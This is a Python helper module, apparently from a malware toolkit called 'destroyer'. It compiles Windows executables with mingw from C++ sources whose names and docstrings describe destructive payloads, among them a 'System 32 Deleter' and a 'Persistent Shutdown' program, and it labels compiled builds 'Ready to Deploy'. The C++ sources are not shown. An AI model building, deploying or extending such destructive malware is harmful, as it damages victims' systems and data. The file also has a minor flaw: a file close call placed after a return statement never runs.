import smtplib
import os
import configparser
import socket

import colorama

from colorama import Fore, Style

config = configparser.ConfigParser()
mainconfig = config['DEFAULT']
config.read("destroyer.ini")

## Tags! Lol

star_yellow = Fore.LIGHTYELLOW_EX + "[+]" + Style.RESET_ALL
star_blue = Fore.LIGHTBLUE_EX + "[*]" + Style.RESET_ALL
star_cyan = Fore.LIGHTCYAN_EX + "[*]" + Style.RESET_ALL
star_red = Fore.LIGHTRED_EX + "[-]" + Style.RESET_ALL
star_bold = Style.BRIGHT + "[~]" + Style.RESET_ALL

def username():
    """Simply return the Username from Configuration file""" 
    return mainconfig["USERNAME"]

    
def hostname():
    """Simply return the System Hostname"""
    return socket.gethostname()

def clear():
    """clear the terminal"""
    os.system("clear")

def ded():
    """DED Compilation"""
    os.system("i686-w64-mingw32-g++ -o Ded.exe source//Ded.cpp")


def pauser():
    """Pauser Compilation"""
    os.system("i686-w64-mingw32-g++ -o Pauser.exe source//pauser.cpp")

def ps():
    """Persistent Shutdown Compilation"""
    os.system("i686-w64-mingw32-g++ -o ps.exe source//persistentshutdown.cpp")

def sys32():
    """System 32 Deleter Compilation"""
    os.system("i686-w64-mingw32-g++ -o sys32.exe source//sys32.cpp")

def check_status(destroyer):
    """Check status of a Destroyer"""
    try:
        exe = open(destroyer, "rb")
        return Fore.LIGHTYELLOW_EX + "Ready to Deploy" + Style.RESET_ALL
        exe.close()
    except FileNotFoundError:
        return Fore.RED + "Not Compiled" + Style.RESET_ALL